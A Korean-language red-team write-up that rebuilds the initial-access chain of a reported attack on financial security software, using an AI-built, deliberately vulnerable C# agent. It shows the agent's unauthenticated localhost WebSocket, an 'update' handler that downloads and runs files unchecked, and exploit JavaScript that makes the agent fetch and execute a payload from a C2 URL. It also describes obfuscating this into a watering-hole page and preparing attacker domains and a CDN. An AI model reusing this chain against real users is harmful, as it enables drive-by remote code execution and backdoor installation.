# 3. Financial Security Software I

### 들어가기 앞서 - 주의사항

> 본 프로젝트에서는 FSS-I과 관련된 실제 취약점이나 익스플로잇은 일체 사용되지 않았습니다. 공개된 보고서 정보를 바탕으로 AI를 활용해 일부러 취약한 소프트웨어를 제작한 것이며, 실제 소프트웨어와는 일체 관련이 없습니다.

### 코드&#x20;

[https://github.com/ChoiSG/Operation-Triple-Barrel/tree/main/financial-security-software-I](https://github.com/ChoiSG/Operation-Triple-Barrel/tree/main/financial-security-software-I)

### Demo

{% file src="../.gitbook/assets/fss-i-callback-demo.mp4" %}

### 개요

본 프로젝트는 AI를 활용한 Maldev/Capdev에 초점이 맞춰져 있고, 초기 침투 때 어떤 취약점이 사용됐는지는 사실 크게 중요하지 않다. 이 취약점이 아니더라도 AI로 수많은 취약점, 제로데이, N-day를 찾아내거나 활용할 수 있고, 취약점이 아니라 사회공학적 공격을 통해 초기 침투하는 것이 훨씬 더 효과적이기 때문이다.

따라서, 본 프로젝트에서도 워터링 홀을 비롯한 FSS-I 관련 취약점 및 익스플로잇은 최소한으로 다뤘다. PoC 및 초기 침투용 체인을 만든다는 것에만 초점을 뒀다. 작전 보안이나 익스플로잇 개발(FSS-A의 버퍼오버플로우 등)은 Maldev/Capdev라고 보기 어렵고, AI를 활용한 취약점 연구 및 익스플로잇 개발은 이미 많이 이뤄지고 있기 때문에 본 프로젝트에서는 다루지 않는다.

### FSS-I

보고서 내용에 따르자면 FSS-A, FSS-I는 모두 유저들의 엔드포인트에 설치되는 소프트웨어며, 설치 후 로컬호스트에 웹소켓을 열고, 정상 홈페이지에 방문한 뒤 웹서버와 소통하며 보안 관련 기능을 수행하는 것으로 추정된다.

이런 경우, 대부분 프로그램이 실행될 때 웹소켓이 같이 열리게 된다.

```csharp
// financial-security-software-I/FssAgent/Program.cs:13~24
var server = new WebSocketServer("http://127.0.0.1:4441/");
await server.RunAsync(cts.Token);
```

대부분의 경우 웹소켓을 열더라도 도메인 화이트리스트를 하거나, 토큰등을 요구하는 경우가 있지만, 더블 배럴 보고서에 나온 것처럼 그냥 완전히 해당 웹소켓을 열어놓고 그 어떠한 연결을 받아주는 경우도 있다.

이렇게 웹소켓으로 들어오는 데이터는 UTF-8로 디코딩된 뒤, `CommandHandler`로 넘어간다.

```csharp
// financial-security-software-I/FssAgent/WebSocketServer.cs:50~58
var result = await ws.ReceiveAsync(buffer, ct);
var message = Encoding.UTF8.GetString(buffer, 0, result.Count);
var response = await _handler.HandleAsync(message);

// financial-security-software-I/FssAgent/CommandHandler.cs:13~50
root = JsonDocument.Parse(message).RootElement;
root.TryGetProperty("cmd", out var cmdProp);
var cmd = cmdProp.GetString();

return cmd switch
{
    "getVersion" => Ok(new { version = "3.3.2.41", product = "FinSecI" }),
    "getStatus"  => Ok(new { running = true, pid = Environment.ProcessId, ... }),
    "getCertInfo" => Ok(new { issuer = "FSSIVendor", valid = true, ... }),
    "update"     => await HandleUpdateAsync(root),
    _ => Error($"Unknown command: {cmd}")
};
```

`CommandHandler`에서는 JSON을 파싱하고, `cmd` 필드에 따라 각각의 명령어를 실행한다. 정상적인 형태라면 백엔드 서버가 원하는 명령어를 내리고, 클라이언트단의 에이전트는 해당 명령어를 잘 받아서 실행만 하면 되는 구조다.

하지만 위에서처럼 `... 그냥 완전히 해당 웹소켓을 열어놓고 모든 연결을 받아주는 경우`가 있다면, 바로 보고서에 나왔던 것처럼 워터링홀/스피어피싱 + 악성 자바스크립트를 통한 공격이 가능해진다.

특히 페이지 35의 다이어그램처럼 Struggle 초기 침투 사례의 경우, FSS-I 익스가 터진 뒤 "Download & Execute"를 통해 Struggle 백도어를 다운받고 실행하는 형태다.

// Figure 27 스크린샷 찍은 뒤 첨부 - 이건 추후 직접 추가.

페이지 32에서는 "취약점을 악용한 후 백도어 악성코드인 Struggle을 Microsoft 정상 프로세스에 인젝션하여 실행한 것으로 확인되었다"라고 했지만, 페이지 34에는 "워터링 홀 기법을 통해 Struggle을 다운로드 및 실행한 것으로 확인되었다"라고 적혀 있어, 정확히 취약점 익스 → 프로세스 인젝션이 이뤄진 것인지, 아니면 취약점 익스 → Struggle 다운로드 및 온디스크 실행인지는 확실치 않다.

하지만 페이지 34의 "Type A"에서 Struggle DLL은 어쨌든 AppleWin으로 위장한 PE 바이너리 속에 내장되어 있던 것으로 보아, 취약점 익스가 바로 RCE까지 터지는 형태가 아니라, 단순한 파일 다운로드/실행만 가능한 경우였을 수도 있다.

어찌 됐건, 개요에서 언급한 대로 취약점에 너무 매몰되지 않기 위해 일단은 페이지 34, 35를 기반으로 취약점 익스 → 파일 다운로드 → 파일 실행이라는 흐름으로 구현했다. 이 흐름은 이런 종류의 소프트웨어들이 업데이트를 진행할 때 나오는 패턴이기도 해서, 나름 현실성이 있다고 판단했다.

취약한 `update` 커맨드 핸들러는 URL에서 파일을 다운로드한 뒤 바로 실행한다. 업데이트 파일에 대한 코드 서명 체크라던지, 별 다른 검증 없이 실행하기 때문에 여기서 익스가 터지게 된다.

```csharp
// financial-security-software-I/FssAgent/CommandHandler.cs:62~86
var url = urlProp.GetString()!;
var path = pathProp.GetString()!;
var exec = execProp.GetString()!;

Directory.CreateDirectory(path);
await Downloader.DownloadAsync(url, path);

var execPath = Path.Combine(path, exec);
Process.Start(new ProcessStartInfo
{
    FileName = execPath,
    WorkingDirectory = path,
    UseShellExecute = false
});
```

익스플로잇은 간단하다. 피해자 호스트의 로컬호스트 웹소켓에 연결한 뒤, 에이전트가 살아있는지 확인하고, 공격자 서버에서 페이로드를 다운로드/실행하도록 `update` 커맨드를 보낸다. `Update` 커맨드의 포멧에 맞춰 cmd, url, path, exec을 설정한 JSON 페이로드를 전송하기만 하면 된다.

```javascript
// financial-security-software-I/exploit/exploit.js:13~42
var ws = new WebSocket("ws://127.0.0.1:4441/");

ws.onopen = function () {
    ws.send(JSON.stringify({ cmd: "getVersion" }));
};

ws.onmessage = function (ev) {
    var resp = JSON.parse(ev.data);
    if (stage === 0 && resp.status === "ok") {
        stage = 1;
        ws.send(JSON.stringify({
            cmd: "update",
            url: C2_URL,
            path: "C:\\ProgramData\\imonclient",
            exec: "AppleWin.exe"
        }));
    }
};
```

### 무기화

여기까지 준비했다면, 해당 익스 코드를 난독화한 뒤 HTML에 삽입하면 끝이다. 워터링 홀 페이지는 정상적인 블로그 글처럼 보이는 HTML로 만들었고, 익스플로잇 자바스크립트는 페이지 하단에 삽입된다.

<figure><img src="../.gitbook/assets/image (159).png" alt=""><figcaption></figcaption></figure>

공격자 인프라는 도메인 구입 → 에이징/카테고리화 → CDN까지 붙여놓은 뒤, 누구나 방문 가능하게 설정했다. 실제 작전이었다면 앞단에 Cloudflare Turnstile까지 붙였겠지만, 데모로서는 투머치라고 판단해 생략했다. 지금은 CDN과 도메인 모두 내려갔지만, 아무튼 이런 모습이었다:

<figure><img src="../.gitbook/assets/image (160).png" alt=""><figcaption></figcaption></figure>

### 참고

크로미움 기반 브라우저들은 버전 141, 더 현실적으로는 버전 145부터 기본적으로 Local Network Access가 차단된다. 특정 웹사이트에서 클라이언트의 로컬 네트워크에 요청을 날릴 때 브라우저단에서 허용/금지를 묻는 메시지를 띄우게 한 것이다. 물론 사회공학적 기법으로 우회하는 방법이 있을 수 있고, 빨리빨리를 중시하는 우리나라에서는 별거 아닌 듯이 바로 허용을 누르는 경우도 있겠지만, 어쨌든 이런 종류의 취약점을 막는 데에는 효과적이다. 다만 Operation Double Barrel은 2025년에 이뤄진 공격이기 때문에, 피해자들의 브라우저가 아무리 최신 버전이었다 해도 아무런 경고 없이 바로 익스됐을 것이다.
